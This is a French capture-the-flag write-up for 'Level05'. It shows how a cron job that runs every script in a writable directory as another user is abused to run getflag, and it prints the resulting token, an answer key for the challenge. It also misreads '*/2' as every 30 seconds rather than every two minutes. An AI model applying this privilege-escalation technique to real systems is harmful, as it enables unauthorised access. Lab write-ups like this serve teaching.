# Level05

À la connexion au niveau nous reçevons une notification :

```bash
You have new mail.
```

On consulte donc nos mails :

```bash
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Le mail contient une tâche cron qui va exécuter <code>/usr/sbin/openarenaserver</code> toutes les 30 secondes avec les droits de flag05.

```bash
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Ce script exécute tous les scripts contenus dans le dossier <code>/opt/openarenaserver/</code> puis les supprime.

On place donc un script qui exécute la commande getflag dans ce dossier :

```bash
$ echo "getflag > /tmp/token" > /tmp/getflag.sh
$ mv /tmp/getflag.sh /opt/openarenaserver/getflag.sh
$ ls /opt/openarenaserver/
getflag.sh
```

On attends que le fichier disparaisse pour récupérer notre résultat :

```bash
$ cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
